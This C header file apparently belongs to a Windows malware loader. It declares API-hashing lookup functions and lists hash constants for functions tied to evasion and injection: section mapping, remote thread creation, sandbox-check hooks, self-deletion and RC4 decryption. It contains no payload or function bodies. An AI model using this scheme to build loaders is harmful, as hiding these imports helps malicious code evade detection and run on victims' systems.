#ifndef API_HASHING_H
#define API_HASHING_H

#include "../../common.h"

BOOL InitializeApiFunctions();
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

#define NtQuerySystemInformation_JOAA			0x7B9816D6
#define NtCreateSection_JOAA					0x192C02CE
#define NtMapViewOfSection_JOAA					0x91436663
#define NtUnmapViewOfSection_JOAA				0x0A5B9402
#define NtClose_JOAA							0x369BD981
#define NtCreateThreadEx_JOAA					0x8EC0B84A
#define NtWaitForSingleObject_JOAA				0x6299AD3D
#define NtDelayExecution_JOAA					0xB947891A

#define GetTickCount64_JOAA						0x00BB616E
#define OpenProcess_JOAA						0xAF03507E
#define CallNextHookEx_JOAA						0xB8B1ADC1
#define SetWindowsHookExW_JOAA					0x15580F7F
#define GetMessageW_JOAA						0xAD14A009
#define DefWindowProcW_JOAA						0xD96CEDDC
#define UnhookWindowsHookEx_JOAA				0x9D2856D0
#define GetModuleFileNameW_JOAA					0xAB3A6AA1
#define CreateFileW_JOAA						0xADD132CA
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define CloseHandle_JOAA						0x9E5456F2

#define SystemFunction032_JOAA					0x8CFD40A8


#define KERNEL32DLL_JOAA						0xFD2AD9BD
#define USER32DLL_JOAA							0x349D72E7

#endif
